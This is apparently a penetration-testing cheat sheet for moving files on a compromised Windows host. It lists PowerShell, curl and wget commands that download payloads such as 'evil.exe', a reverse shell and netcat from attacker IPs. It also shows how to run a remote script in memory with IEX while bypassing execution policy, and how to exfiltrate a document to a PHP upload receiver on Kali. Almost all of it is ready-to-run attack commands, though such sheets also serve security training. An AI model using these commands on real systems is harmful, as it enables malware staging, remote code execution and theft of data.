## 1. Download files using HTTP
Create a Powershell Script and execute it
```powershell 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
		# -ExecutionPolicy Bypass : Bypass restricted execution (by default)
		# -NoLogo : Hide Powershell Logo
		# -NonInteractive : Suppress interactive Poweshell Prompt 
		# -NoProfile : Don't load the default profile
		# -File : Execute the file
```

## 2. Execute a PowerShell script directly in memory
```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

## 3. Download a file using powershell
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')   
powershell IWR -uri http://10.10.10.10/nc.exe -OutFile c:\\windows\\temp\\nc.exe
```

## 4. Using CURL and WGET (Windows 10, probably windows 8 and some versions of 7)
```powershell
curl -o c:\Windows\temp\rev.exe http://10.10.10.10:8000/rev.exe
wget http://10.10.10.10.:8000/rev.exe -o c:\Windows\temp\rev.exe
```

## 5. Upload file using PowerShell
A. On Kali, create a PHP script to receive files
```php
<?php
	$uploaddir = '/var/www/uploads/';
	$uploadfile = $uploaddir . $_FILES['file']['name'];
	move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

B. On Kali, Configure a folder
```bash
sudo mkdir /var/www/uploads
ps -ef | grep apache
sudo chown www-data: /var/www/uploads
ls -al
```

C. On Windows, execute the powershell script
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```